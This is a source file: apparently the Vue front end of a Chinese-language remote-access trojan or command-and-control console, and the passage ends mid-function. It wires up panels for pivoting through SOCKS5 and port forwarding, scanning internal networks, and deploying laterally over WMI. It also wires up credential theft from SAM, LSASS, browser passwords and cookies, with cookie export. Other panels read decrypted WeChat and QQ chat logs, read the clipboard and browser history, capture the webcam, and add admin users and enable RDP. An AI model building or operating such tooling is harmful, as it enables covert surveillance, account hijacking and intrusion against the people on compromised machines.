            <input v-if="!socksRunning" v-model="socksAuthPass" class="reg-input" style="width:70px;flex:none" type="password" placeholder="密码(可选)" />
            <button v-if="!socksRunning" class="term-btn" @click="doSocksStart" :disabled="socksLoading">
              {{ socksLoading ? '启动中...' : '启动' }}
            </button>
            <button v-if="socksRunning" class="term-btn danger" @click="doSocksStop" :disabled="socksLoading">停止</button>
          </div>
        </div>
        <div class="tk-body">
          <div v-if="socksRunning" class="tk-result-msg">
            SOCKS5 代理监听在服务器的 <b>0.0.0.0:{{ socksPort }}</b>，配置代理: <code>socks5://{{ socksAuthUser ? socksAuthUser+':***@' : '' }}服务器IP:{{ socksPort }}</code>
            <span v-if="socksAuthUser" style="color:#10b981;margin-left:8px">🔐 已启用认证</span>
          </div>
          <div class="tk-empty" v-else>启动后流量通过 Agent 所在网络出口转发，用于内网穿透</div>
          <div class="tk-result-msg" v-if="socksError" style="color:#e74c3c">{{ socksError }}</div>
        </div>
      </div>

      <!-- 端口转发 -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent'">
        <div class="lateral-header">
          <span class="section-title">端口转发</span>
          <div class="term-actions">
            <button class="term-btn" @click="doPfRefresh" :disabled="pfLoading">{{ pfLoading ? '...' : '刷新' }}</button>
          </div>
        </div>
        <div class="tk-body">
          <div class="proc-table-wrap" v-if="pfList.length">
            <table class="lateral-table">
              <thead><tr>
                <th style="width:100px">本地端口</th>
                <th>远程目标</th>
                <th style="width:80px">操作</th>
              </tr></thead>
              <tbody>
                <tr v-for="pf in pfList" :key="pf.localPort">
                  <td><code>{{ pf.localPort }}</code></td>
                  <td>{{ pf.remoteHost }}:{{ pf.remotePort }}</td>
                  <td><button class="qcmd-btn danger" @click="doPfStop(pf.localPort)">删除</button></td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="reg-write-bar" style="margin-top:6px">
            <input v-model.number="pfLocalPort" class="reg-input" style="width:80px" placeholder="本地端口" />
            <input v-model="pfRemoteHost" class="reg-input" style="width:140px" placeholder="远程主机" />
            <input v-model.number="pfRemotePort" class="reg-input" style="width:80px" placeholder="远程端口" />
            <button class="term-btn" @click="doPfStart" :disabled="pfLoading">添加</button>
          </div>
          <div class="tk-empty" v-if="!pfList.length && !pfLoading">添加端口转发规则，流量通过 Agent 中转到目标内网</div>
          <div class="tk-result-msg" v-if="pfError" style="color:#e74c3c">{{ pfError }}</div>
        </div>
      </div>

      <!-- ═══ Windows Agent 工具箱 ═══ -->
      <div class="win-toolkit-grid" v-if="detail?.connectMethod === 'agent' && detail?.osType?.toLowerCase().includes('windows')">

        <!-- ── 第一行：剪贴板 + RDP 管理（半宽并排） ── -->
        <div class="lateral-section tk-half">
          <div class="lateral-header">
            <span class="section-title"><i class="tk-icon">&#128203;</i>剪贴板</span>
            <div class="term-actions">
              <button class="term-btn" @click="doClipboardDump" :disabled="clipLoading">
                {{ clipLoading ? '获取中...' : '获取' }}
              </button>
            </div>
          </div>
          <div class="tk-body">
            <div class="keylog-output" v-if="clipResult" style="max-height:120px;">
              <pre class="keylog-pre">{{ clipResult }}</pre>
            </div>
            <div class="tk-empty" v-else-if="!clipLoading">读取目标机器剪贴板内容</div>
          </div>
        </div>

        <div class="lateral-section tk-half">
          <div class="lateral-header">
            <span class="section-title"><i class="tk-icon">&#128421;</i>RDP 远程桌面</span>
            <div class="term-actions">
              <button class="term-btn" @click="doRdpManage('enable')" :disabled="rdpLoading">启用</button>
              <button class="term-btn danger" @click="doRdpManage('disable')" :disabled="rdpLoading">禁用</button>
            </div>
          </div>
          <div class="tk-body">
            <div class="rdp-row">
              <span class="rdp-label">端口:</span>
              <input v-model.number="rdpPort" class="reg-input" style="width:70px;flex:none" placeholder="3389" />
              <button class="term-btn" @click="doRdpManage('port')" :disabled="rdpLoading">修改</button>
            </div>
            <div class="tk-result-msg" v-if="rdpResult">{{ rdpResult }}</div>
          </div>
        </div>

        <!-- ── 用户管理（全宽） ── -->
        <div class="lateral-section tk-full">
          <div class="lateral-header">
            <span class="section-title"><i class="tk-icon">&#128100;</i>用户管理</span>
            <div class="term-actions">
              <button class="term-btn" @click="doUserList" :disabled="userMgmtLoading">
                {{ userMgmtLoading ? '加载中...' : '刷新' }}
              </button>
            </div>
          </div>
          <div class="proc-table-wrap" v-if="userMgmtList.length">
            <table class="lateral-table">
              <thead><tr>
                <th>用户名</th><th>全名</th><th>描述</th>
                <th style="width:70px">管理员</th><th style="width:70px">禁用</th><th style="width:55px">操作</th>
              </tr></thead>
              <tbody>
                <tr v-for="u in userMgmtList" :key="u.name">
                  <td class="proc-name">{{ u.name }}</td>
                  <td>{{ u.fullName || '-' }}</td>
                  <td>{{ u.comment || '-' }}</td>
                  <td><span :class="['svc-state', u.isAdmin ? 'running' : 'stopped']">{{ u.isAdmin ? '是' : '否' }}</span></td>
                  <td><span :class="['svc-state', u.disabled ? 'stopped' : 'running']">{{ u.disabled ? '是' : '否' }}</span></td>
                  <td><button class="qcmd-btn danger" @click="doUserDelete(u.name)" :disabled="userMgmtLoading">删除</button></td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="tk-empty" v-if="!userMgmtList.length && !userMgmtLoading">点击「刷新」获取系统用户列表</div>
          <div class="reg-write-bar">
            <input v-model="newUserName" placeholder="用户名" class="reg-input" />
            <input v-model="newUserPass" placeholder="密码" type="password" class="reg-input" />
            <label class="reg-checkbox"><input type="checkbox" v-model="newUserAdmin" /> 管理员</label>
            <button class="term-btn" @click="doUserAdd" :disabled="userMgmtLoading">添加</button>
          </div>
        </div>

        <!-- ── 注册表编辑器（全宽） ── -->
        <div class="lateral-section tk-full">
          <div class="lateral-header">
            <span class="section-title"><i class="tk-icon">&#128218;</i>注册表编辑器</span>
            <div class="file-path-bar" style="flex:1;max-width:480px">
              <input class="file-path-input" v-model="regPath" placeholder="HKLM\SOFTWARE" @keyup.enter="doRegBrowse" />
              <button class="term-btn" @click="doRegBrowse" :disabled="regLoading">{{ regLoading ? '...' : '浏览' }}</button>
            </div>
          </div>
          <div class="file-current-path" v-if="regResult">
            <span class="font-num" style="flex:1;overflow:hidden;text-overflow:ellipsis">{{ regResult.path }}</span>
            <button class="qcmd-btn" @click="regGoUp" v-if="regResult.path && regResult.path.includes('\\')">&#8593; 上级</button>
          </div>
          <div class="file-error" v-if="regResult?.error">{{ regResult.error }}</div>
          <div v-if="regResult?.subkeys?.length" class="reg-subkeys">
            <span class="reg-subkey" v-for="sk in regResult.subkeys" :key="sk" @click="regNavigate(sk)">{{ sk }}</span>
          </div>
          <div class="proc-table-wrap" v-if="regResult?.values?.length">
            <table class="lateral-table">
              <thead><tr>
                <th style="width:30%">名称</th><th style="width:14%">类型</th><th>数据</th><th style="width:55px">操作</th>
              </tr></thead>
              <tbody>
                <tr v-for="v in regResult.values" :key="v.name">
                  <td class="proc-name">{{ v.name || '(默认)' }}</td>
                  <td>{{ v.type }}</td>
                  <td class="font-num" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">{{ v.data }}</td>
                  <td><button class="qcmd-btn danger" @click="doRegDelete(v.name)" :disabled="regLoading">删除</button></td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="reg-write-bar" v-if="regResult">
            <input v-model="regWriteName" placeholder="值名称" class="reg-input" />
            <select v-model="regWriteType" class="screen-select">
              <option value="REG_SZ">REG_SZ</option>
              <option value="REG_DWORD">REG_DWORD</option>
              <option value="REG_QWORD">REG_QWORD</option>
              <option value="REG_EXPAND_SZ">REG_EXPAND_SZ</option>
            </select>
            <input v-model="regWriteData" placeholder="数据" class="reg-input" style="flex:2" />
            <button class="term-btn" @click="doRegWrite" :disabled="regLoading">写入</button>
          </div>
          <div class="tk-empty" v-if="!regResult && !regLoading">输入路径后点击「浏览」</div>
        </div>

        <!-- ── 浏览器历史（全宽） ── -->
        <div class="lateral-section tk-full" v-if="detail?.connectMethod === 'agent'">
          <div class="lateral-header">
            <span class="section-title"><i class="tk-icon">&#128218;</i>浏览器历史</span>
            <div class="term-actions">
              <select v-model="bhTab" class="reg-input" style="width:120px;flex:none">
                <option value="chromiumHistory">浏览历史</option>
                <option value="favorites">IE收藏夹</option>
                <option value="ieTypedUrls">IE输入记录</option>
                <option value="chromiumBookmarks">书签</option>
              </select>
              <input class="proc-filter-input" v-model="bhFilter" placeholder="搜索..." />
              <button class="term-btn" @click="doBrowserHistory" :disabled="bhLoading">{{ bhLoading ? '获取中...' : '获取' }}</button>
            </div>
          </div>
          <div class="proc-table-wrap" v-if="filteredBh.length">
            <table class="lateral-table">
              <thead><tr v-if="bhTab === 'chromiumHistory'">
                <th style="width:70px">浏览器</th><th style="width:35%">标题</th><th>URL</th><th style="width:55px">访问次数</th>
              </tr>
              <tr v-else-if="bhTab === 'favorites'">
                <th style="width:20%">文件夹</th><th style="width:30%">名称</th><th>URL</th>
              </tr>
              <tr v-else-if="bhTab === 'ieTypedUrls'">
                <th style="width:80px">序号</th><th>URL</th>
              </tr>
              <tr v-else>
                <th style="width:70px">浏览器</th><th style="width:30%">名称</th><th>URL</th>
              </tr></thead>
              <tbody>
                <tr v-for="(b, idx) in filteredBh" :key="idx">
                  <template v-if="bhTab === 'chromiumHistory'">
                    <td><span class="svc-state running">{{ b.browser }}</span></td>
                    <td :title="b.title">{{ b.title || '-' }}</td>
                    <td class="font-num" style="word-break:break-all"><a :href="b.url" target="_blank" style="color:#60a5fa">{{ b.url }}</a></td>
                    <td class="font-num">{{ b.visits }}</td>
                  </template>
                  <template v-else-if="bhTab === 'favorites'">
                    <td style="color:#94a3b8">{{ b.folder || '/' }}</td>
                    <td>{{ b.name }}</td>
                    <td class="font-num" style="word-break:break-all"><a :href="b.url" target="_blank" style="color:#60a5fa">{{ b.url }}</a></td>
                  </template>
                  <template v-else-if="bhTab === 'ieTypedUrls'">
                    <td class="font-num">{{ b.name }}</td>
                    <td class="font-num" style="word-break:break-all"><a :href="b.url" target="_blank" style="color:#60a5fa">{{ b.url }}</a></td>
                  </template>
                  <template v-else>
                    <td><span class="svc-state running">{{ b.browser }}</span></td>
                    <td>{{ b.name }}</td>
                    <td class="font-num" style="word-break:break-all"><a :href="b.url" target="_blank" style="color:#60a5fa">{{ b.url }}</a></td>
                  </template>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="tk-empty" v-else-if="!bhLoading && bhData">无数据</div>
          <div class="tk-empty" v-else-if="!bhLoading">点击「获取」读取目标浏览器历史（IE/Chrome/Edge/Brave/360/QQ浏览器）</div>
        </div>

        <!-- ── 网络连接（全宽） ── -->
        <div class="lateral-section tk-full">
          <div class="lateral-header">
            <span class="section-title"><i class="tk-icon">&#127760;</i>网络连接</span>
            <div class="term-actions">
              <input class="proc-filter-input" v-model="netstatFilter" placeholder="搜索..." />
              <button class="term-btn" @click="doNetstat" :disabled="netstatLoading">{{ netstatLoading ? '...' : '刷新' }}</button>
            </div>
          </div>
          <div class="proc-table-wrap" v-if="netstatList.length">
            <table class="lateral-table">
              <thead><tr>
                <th style="width:55px">协议</th><th>本地地址</th><th>远程地址</th>
                <th style="width:130px">IP归属地</th>
                <th style="width:85px">状态</th><th style="width:45px">PID</th><th>进程</th>
              </tr></thead>
              <tbody>
                <tr v-for="(n, idx) in filteredNetstat" :key="idx">
                  <td>{{ n.proto }}</td>
                  <td class="font-num">{{ n.local }}</td>
                  <td class="font-num">{{ n.remote }}</td>
                  <td class="ip-location">{{ n.location || '-' }}</td>
                  <td><span :class="['svc-state', n.state==='ESTABLISHED'||n.state==='LISTEN' ? 'running' : 'stopped']">{{ n.state }}</span></td>
                  <td>{{ n.pid }}</td>
                  <td class="proc-name">{{ n.process || '-' }}</td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="tk-empty" v-else-if="!netstatLoading">点击「刷新」查看活跃连接</div>
        </div>

        <!-- ── 已安装软件（全宽） ── -->
        <div class="lateral-section tk-full">
          <div class="lateral-header">
            <span class="section-title"><i class="tk-icon">&#128230;</i>已安装软件</span>
            <div class="term-actions">
              <input class="proc-filter-input" v-model="swFilter" placeholder="搜索..." />
              <button class="term-btn" @click="doSoftwareList" :disabled="swLoading">{{ swLoading ? '...' : '刷新' }}</button>
            </div>
          </div>
          <div class="proc-table-wrap" v-if="swList.length">
            <table class="lateral-table">
              <thead><tr>
                <th style="width:28%">名称</th><th style="width:12%">版本</th><th style="width:15%">发布者</th><th style="width:10%">安装日期</th><th style="width:35%">卸载命令</th>
              </tr></thead>
              <tbody>
                <tr v-for="(s, idx) in filteredSw" :key="idx">
                  <td :title="s.location">{{ s.name }}</td>
                  <td class="font-num">{{ s.version || '-' }}</td>
                  <td>{{ s.publisher || '-' }}</td>
                  <td class="font-num">{{ s.installDate || '-' }}</td>
                  <td class="font-num" style="font-size:11px;word-break:break-all;color:#94a3b8" :title="s.uninstall">{{ s.uninstall || '-' }}</td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="tk-empty" v-else-if="!swLoading">点击「刷新」获取已安装软件列表</div>
        </div>

        <!-- ── 系统信息收集（全宽） ── -->
        <div class="lateral-section tk-full">
          <div class="lateral-header">
            <span class="section-title"><i class="tk-icon">&#128187;</i>系统信息收集</span>
            <div class="term-actions">
              <button class="term-btn" @click="doInfoDump" :disabled="infoDumpLoading">{{ infoDumpLoading ? '收集中...' : '收集信息' }}</button>
            </div>
          </div>
          <div class="info-dump-result" v-if="infoDumpResult">
            <table class="lateral-table" style="table-layout:fixed">
              <tbody>
                <tr v-if="infoDumpResult.hostname"><td style="width:120px;font-weight:600;color:#94a3b8">主机名</td><td>{{ infoDumpResult.hostname }}</td>
                    <td style="width:120px;font-weight:600;color:#94a3b8">用户名</td><td>{{ infoDumpResult.username || '-' }}</td></tr>
                <tr v-if="infoDumpResult.os"><td style="font-weight:600;color:#94a3b8">操作系统</td><td>{{ infoDumpResult.os }}</td>
                    <td style="font-weight:600;color:#94a3b8">架构</td><td>{{ infoDumpResult.arch || '-' }}</td></tr>
                <tr v-if="infoDumpResult.domain"><td style="font-weight:600;color:#94a3b8">域</td><td>{{ infoDumpResult.domain }}</td>
                    <td style="font-weight:600;color:#94a3b8">管理员</td><td>{{ infoDumpResult.isAdmin || '-' }}</td></tr>
                <tr v-if="infoDumpResult.antivirus"><td style="font-weight:600;color:#94a3b8">杀毒软件</td><td colspan="3">{{ infoDumpResult.antivirus }}</td></tr>
                <tr v-if="infoDumpResult.network"><td style="font-weight:600;color:#94a3b8">网络</td><td colspan="3" style="white-space:pre-wrap;word-break:break-all;font-size:12px">{{ infoDumpResult.network }}</td></tr>
              </tbody>
            </table>
            <div v-if="infoDumpResult.env" class="info-dump-sub" style="margin-top:8px">
              <strong style="color:#94a3b8">环境变量:</strong>
              <pre class="keylog-pre" style="max-height:160px;font-size:11px;margin-top:4px;white-space:pre-wrap;word-break:break-all">{{ infoDumpResult.env }}</pre>
            </div>
            <div v-if="infoDumpResult.recent_docs" class="info-dump-sub">
              <strong style="color:#94a3b8">最近文档:</strong>
              <pre class="keylog-pre" style="max-height:120px;font-size:11px;margin-top:4px;white-space:pre-wrap;word-break:break-all">{{ infoDumpResult.recent_docs }}</pre>
            </div>
          </div>
          <div class="tk-empty" v-else-if="!infoDumpLoading">点击「收集信息」获取完整系统信息</div>
        </div>

        <!-- 文件操作已合并到上方文件管理面板 -->

      </div><!-- /win-toolkit-grid -->
    </template>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, computed, onMounted, onUnmounted } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import * as echarts from 'echarts'
import { serverApi, metricApi } from '@/api'
import { Terminal } from '@xterm/xterm'
import { FitAddon } from '@xterm/addon-fit'
import { ClipboardAddon } from '@xterm/addon-clipboard'
import '@xterm/xterm/css/xterm.css'

const route = useRoute()
const router = useRouter()
const loading = ref(true)
const detail = ref<any>(null)
const period = ref('1h')
const cpuGaugeRef = ref<HTMLElement>()
const historyChartRef = ref<HTMLElement>()
const xtermRef = ref<HTMLElement>()
let gaugeChart: echarts.ECharts | null = null
let historyChart: echarts.ECharts | null = null

// 交互式终端
const termStatus = ref<'disconnected' | 'connecting' | 'connected'>('disconnected')
const termStatusText = computed(() => {
  switch (termStatus.value) {
    case 'connected': return '已连接'
    case 'connecting': return '连接中...'
    default: return '未连接'
  }
})

let term: Terminal | null = null
let fitAddon: FitAddon | null = null
let termWs: WebSocket | null = null
let resizeObserver: ResizeObserver | null = null
let pipeMode = false // agent 管道模式下本地回显
let pipeInputLen = 0 // 管道模式：当前行已输入字符数（防止退格删提示符）

// 桌面查看器
const screenStatus = ref<'disconnected' | 'connected'>('disconnected')
const screenStatusText = computed(() => screenStatus.value === 'connected' ? '实时查看中' : '未连接')
const screenFrame = ref(false)  // true when canvas has content
const screenCanvasRef = ref<HTMLCanvasElement | null>(null)
const screenError = ref('')
const screenFps = ref(10)
const screenQuality = ref(70)
const screenScale = ref(100)
const screenControlMode = ref(false)
let screenWs: WebSocket | null = null
let screenNativeW = 0
let screenNativeH = 0
let lastMouseMoveTime = 0
let h264Decoder: any = null
let h264Configured = false
let h264Timestamp = 0
// 差分帧: 待绘制区域
let pendingFrameRect: { x: number; y: number; cw: number; ch: number; full: boolean; width: number; height: number } | null = null

// 快捷指令
const quickCmdLoading = ref(false)
const quickCmdMsg = ref('')
let quickCmdTimer: ReturnType<typeof setTimeout> | null = null

// 内网扫描 & 横向部署
const scanLoading = ref(false)
const scanResult = ref<any>(null)
const deployTarget = ref<any>(null)
const deployLoading = ref(false)
const deployResultMsg = ref('')
const deployResultOk = ref(false)
const deployForm = reactive({ username: 'Administrator', password: '', method: 'wmi' })
const hostDeployStatus = reactive<Record<string, { ok: boolean; msg: string }>>({})

// 一键部署：不填凭据，直接用 Agent 当前身份
async function quickDeploy(host: any) {
  deployLoading.value = true
  hostDeployStatus[host.ip] = { ok: false, msg: '部署中...' }
  try {
    const res: any = await serverApi.lateralDeploy(route.params.id as string, {
      ip: host.ip,
      method: 'wmi',
    })
    if (res.success && res.data && res.data.success) {
      hostDeployStatus[host.ip] = { ok: true, msg: '已部署' }
    } else {
      // 失败 → 自动弹凭据框让用户手动填
      hostDeployStatus[host.ip] = { ok: false, msg: '免密失败，请手动填凭据' }
      openDeployDialog(host)
    }
  } catch (e: any) {
    hostDeployStatus[host.ip] = { ok: false, msg: '失败，请手动' }
    openDeployDialog(host)
  } finally {
    deployLoading.value = false
  }
}

async function startNetScan() {
  scanLoading.value = true
  scanResult.value = null
  try {
    const res: any = await serverApi.netScan(route.params.id as string)
    if (res.success) scanResult.value = res.data
    else scanResult.value = { error: res.error || '扫描失败', hosts: [] }
  } catch (e: any) {
    scanResult.value = { error: e?.response?.data?.error || '请求失败', hosts: [] }
  } finally {
    scanLoading.value = false
  }
}

function openDeployDialog(host: any) {
  deployTarget.value = host
  deployResultMsg.value = ''
  deployResultOk.value = false
}

async function doLateralDeploy() {
  if (!deployTarget.value) return
  deployLoading.value = true
  deployResultMsg.value = ''
  try {
    const res: any = await serverApi.lateralDeploy(route.params.id as string, {
      ip: deployTarget.value.ip,
      username: deployForm.username,
      password: deployForm.password,
      method: deployForm.method,
    })
    if (res.success && res.data) {
      deployResultOk.value = res.data.success
      deployResultMsg.value = res.data.success
        ? `部署成功 (${res.data.error || ''})`
        : `部署失败: ${res.data.error || '未知错误'}`
    } else {
      deployResultOk.value = false
      deployResultMsg.value = res.error || '请求失败'
    }
  } catch (e: any) {
    deployResultOk.value = false
    deployResultMsg.value = e?.response?.data?.error || '请求失败'
  } finally {
    deployLoading.value = false
  }
}

// 凭证窃取
const credMethod = ref('all')
const credLoading = ref(false)
const credResult = ref<any>(null)

async function startCredDump() {
  credLoading.value = true
  credResult.value = null
  try {
    const res: any = await serverApi.credDump(route.params.id as string, { method: credMethod.value })
    if (res.success) credResult.value = res.data
    else credResult.value = { credentials: [], sam: '', lsass: '', error: res.error || '提取失败' }
  } catch (e: any) {
    credResult.value = { credentials: [], sam: '', lsass: '', error: e?.response?.data?.error || '请求失败' }
  } finally {
    credLoading.value = false
  }
}

const revealedPwds = reactive<Record<string, boolean>>({})
function revealPwd(idx: number) {
  revealedPwds[idx] = !revealedPwds[idx]
}

// 分离密码和 Cookie
const credPasswords = computed(() => {
  if (!credResult.value?.credentials) return []
  return credResult.value.credentials.filter((c: any) => c.type !== 1)
})

// ── 社交软件聊天记录 (独立区域) ──
const chatResult = ref<any>(null)
const chatLoading = ref(false)
const chatSelectedConv = ref('')
const chatShowDetails = ref(false)
async function startChatDump() {
  chatLoading.value = true
  chatResult.value = null
  try {
    const res: any = await serverApi.chatDump(route.params.id as string)
    if (res.success) chatResult.value = res.data
    else chatResult.value = { credentials: [], error: res.error || '提取失败' }
  } catch (e: any) {
    chatResult.value = { credentials: [], error: e?.response?.data?.error || '请求失败' }
  } finally {
    chatLoading.value = false
  }
}
const chatConversations = computed(() => {
  if (!chatResult.value?.credentials) return [] as any[]
  const msgs = chatResult.value.credentials.filter((c: any) => c.source === 'wechat-msg' || c.source === 'qq-msg')
  const convMap: Record<string, any[]> = {}
  for (const m of msgs) {
    const key = (m.source === 'wechat-msg' ? '微信|' : 'QQ|') + (m.target || '未知')
    if (!convMap[key]) convMap[key] = []
    let dir = 'recv', content = m.username || '', msgType = '文本'
    if (content.startsWith('[发]')) { dir = 'send'; content = content.substring(3) }
    else if (content.startsWith('[收]')) { dir = 'recv'; content = content.substring(3) }
    const typeMatch = content.match(/^\[([^\]]+)\]\s*/)
    if (typeMatch) { msgType = typeMatch[1]; content = content.substring(typeMatch[0].length) }
    const ts = parseInt(m.password) || 0
    convMap[key].push({ dir, content, msgType, ts, talker: m.target || '未知' })
  }
  const result = Object.entries(convMap).map(([key, messages]) => {
    const [platform, talker] = key.split('|')
    messages.sort((a: any, b: any) => a.ts - b.ts)
    const lastTs = messages[messages.length - 1]?.ts || 0
    return { key, platform, talker, messages, lastTs, count: messages.length }
  })
  result.sort((a, b) => b.lastTs - a.lastTs)
  return result
})
const chatAccountInfo = computed(() => {
  if (!chatResult.value?.credentials) return [] as any[]
  return chatResult.value.credentials.filter((c: any) => c.source === 'wechat' || c.source === 'qq')
})
const chatDbInfo = computed(() => {
  if (!chatResult.value?.credentials) return [] as any[]
  return chatResult.value.credentials.filter((c: any) => c.source === 'wechat-db' || c.source === 'qq-db')
})
const chatErrors = computed(() => {
  if (!chatResult.value?.credentials) return [] as any[]
  return chatResult.value.credentials.filter((c: any) => c.source?.endsWith('-error'))
})
const chatDecryptInfo = computed(() => {
  if (!chatResult.value?.credentials) return [] as any[]
  return chatResult.value.credentials.filter((c: any) => c.source === 'wechat-decrypt' || c.source === 'qq-decrypt')
})
const selectedMessages = computed(() => {
  if (!chatSelectedConv.value) return chatConversations.value[0]?.messages || []
  const conv = chatConversations.value.find((c: any) => c.key === chatSelectedConv.value)
  return conv?.messages || []
})
const selectedConvInfo = computed(() => {
  const key = chatSelectedConv.value || chatConversations.value[0]?.key || ''
  return chatConversations.value.find((c: any) => c.key === key) || null
})
function formatChatTime(ts: number) {
  if (!ts) return ''
  const d = new Date(ts * 1000)
  const now = new Date()
  const pad = (n: number) => n < 10 ? '0' + n : '' + n
  const time = pad(d.getHours()) + ':' + pad(d.getMinutes())
  if (d.toDateString() === now.toDateString()) return time
  return (d.getMonth() + 1) + '/' + d.getDate() + ' ' + time
}
const credCookies = computed(() => {
  if (!credResult.value?.credentials) return []
  return credResult.value.credentials.filter((c: any) => c.type === 1)
})
const cookieSearch = ref('')
const filteredCookies = computed(() => {
  const q = cookieSearch.value.toLowerCase()
  if (!q) return credCookies.value
  return credCookies.value.filter((c: any) =>
    (c.target || '').toLowerCase().includes(q) ||
    (c.username || '').toLowerCase().includes(q) ||
    (c.password || '').toLowerCase().includes(q)
  )
})
function exportCookies() {
  const cookies = credCookies.value
  if (!cookies.length) return
  // Netscape cookie.txt 格式
  let txt = '# Netscape HTTP Cookie File\n'
  for (const c of cookies) {
    const host = c.target || ''
    const name = c.username || ''
    const value = c.password || ''
    const httponly = host.startsWith('.') ? '#HttpOnly_' : ''
    txt += `${httponly}${host}\tTRUE\t/\tFALSE\t0\t${name}\t${value}\n`
  }
  const blob = new Blob([txt], { type: 'text/plain' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url; a.download = 'cookies.txt'; a.click()
  URL.revokeObjectURL(url)
}
function exportCookiesJSON() {
  const cookies = credCookies.value.map((c: any) => ({
    domain: c.target, name: c.username, value: c.password
  }))
  const blob = new Blob([JSON.stringify(cookies, null, 2)], { type: 'application/json' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url; a.download = 'cookies.json'; a.click()
  URL.revokeObjectURL(url)
}

function copyText(text: string, ev?: MouseEvent) {
  const btn = ev?.target as HTMLButtonElement | null
  navigator.clipboard.writeText(text).then(() => {
    if (btn) {
      const orig = btn.textContent
      btn.textContent = '已复制 ✓'
      btn.style.color = '#22c55e'
      setTimeout(() => { btn.textContent = orig; btn.style.color = '' }, 1500)
    }
  }).catch(() => {
    prompt('复制失败，手动复制：', text)
  })
}

function downloadCredData(data: string, filename: string) {
  const blob = new Blob([data], { type: 'text/plain' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = filename
  a.click()
  URL.revokeObjectURL(url)
}

// 文件管理器
const showSensitiveScan = ref(false)
const fileBrowsePath = ref('')
const fileBrowseLoading = ref(false)
const fileBrowseResult = ref<any>(null)
const fileDownloadLoading = ref(false)
const fileDownloadName = ref('')

async function doFileBrowse(pathOverride?: string) {
  fileBrowseLoading.value = true
  const browsePath = typeof pathOverride === 'string' ? pathOverride : fileBrowsePath.value
  try {
    const res: any = await serverApi.fileBrowse(route.params.id as string, browsePath)
    if (res.success) {
      fileBrowseResult.value = res.data
      if (res.data?.path) fileBrowsePath.value = res.data.path
    } else {
      fileBrowseResult.value = { error: res.error || '浏览失败', items: [] }
    }
  } catch (e: any) {
    fileBrowseResult.value = { error: e?.response?.data?.error || '请求失败', items: [] }
  } finally {
    fileBrowseLoading.value = false
  }
}

function fileNavigate(name: string) {
  const current = fileBrowseResult.value?.path || fileBrowsePath.value || ''
  const sep = current.includes('/') ? '/' : '\\'
  const newPath = current.replace(/[/\\]$/, '') + sep + name
  fileBrowsePath.value = newPath
  doFileBrowse(newPath)
}

function fileGoUp() {
  const current = fileBrowseResult.value?.path || fileBrowsePath.value || ''
  const sep = current.includes('/') ? '/' : '\\'
  const parts = current.replace(/[/\\]$/, '').split(/[/\\]/)
  if (parts.length > 1) {
    parts.pop()
    const parent = parts.join(sep) || (sep === '/' ? '/' : parts[0] + sep)
    fileBrowsePath.value = parent
    doFileBrowse(parent)
  }
}

async function doFileDownload(name: string) {
  fileDownloadLoading.value = true
  fileDownloadName.value = name
  const current = fileBrowseResult.value?.path || fileBrowsePath.value || ''
  const sep = current.includes('/') ? '/' : '\\'
  const fullPath = current.replace(/[/\\]$/, '') + sep + name
  try {
    const res: any = await serverApi.fileDownload(route.params.id as string, fullPath)
    if (res.success && res.data?.downloadId) {
      // 大文件：分片已上传到服务器，用 downloadId 下载
      const a = document.createElement('a')
      a.href = `/api/downloads/${res.data.downloadId}`
      a.download = res.data.name || name
      a.click()
    } else if (res.success && res.data?.data) {
      // 小文件：base64 直接解码
      const raw = atob(res.data.data)
      const bytes = new Uint8Array(raw.length)
      for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i)
      const blob = new Blob([bytes])
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = res.data.name || name
      a.click()
      URL.revokeObjectURL(url)
    } else {
      alert(res.data?.error || '下载失败')
    }
  } catch (e: any) {
    alert(e?.response?.data?.error || '下载失败')
  } finally {
    fileDownloadLoading.value = false
    fileDownloadName.value = ''
  }
}

function formatFileSize(bytes: number) {
  if (bytes < 1024) return bytes + ' B'
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB'
  if (bytes < 1024 * 1024 * 1024) return (bytes / 1024 / 1024).toFixed(1) + ' MB'
  return (bytes / 1024 / 1024 / 1024).toFixed(2) + ' GB'
}

// 摄像头监控（WebSocket 二进制推送）
const webcamLoading = ref(false)
const webcamError = ref('')
const webcamMeta = ref('')
const webcamStreaming = ref(false)
const webcamFullscreen = ref(false)
const webcamHasFrame = ref(false)
const webcamViewerRef = ref<HTMLElement | null>(null)
const webcamCanvasRef = ref<HTMLCanvasElement | null>(null)
let webcamWs: WebSocket | null = null
let webcamFrameCount = 0
let webcamLastFrameTime = 0

function toggleWebcamFullscreen() {
  if (!webcamViewerRef.value) return
  if (!document.fullscreenElement) {
    webcamViewerRef.value.requestFullscreen().then(() => { webcamFullscreen.value = true }).catch(() => {})
  } else {
    document.exitFullscreen().then(() => { webcamFullscreen.value = false }).catch(() => {})
  }
}
// 监听 ESC 退出全屏
if (typeof document !== 'undefined') {
  document.addEventListener('fullscreenchange', () => {
    webcamFullscreen.value = !!document.fullscreenElement
  })
}

async function doWebcamSnap() {
  webcamLoading.value = true
  webcamError.value = ''
  try {
    const res: any = await serverApi.webcamSnap(route.params.id as string)
    if (res.success && res.data) {
      if (res.data.error) {
        webcamError.value = res.data.error
      } else if (res.data.image) {
        // 拍照结果渲染到 canvas
        const raw = atob(res.data.image)
        const bytes = new Uint8Array(raw.length)
        for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i)
        const blob = new Blob([bytes], { type: 'image/jpeg' })
        const bmp = await createImageBitmap(blob)
        const cvs = webcamCanvasRef.value
        if (cvs) {
          cvs.width = bmp.width; cvs.height = bmp.height
          cvs.getContext('2d')?.drawImage(bmp, 0, 0)
          webcamHasFrame.value = true
        }
        bmp.close()
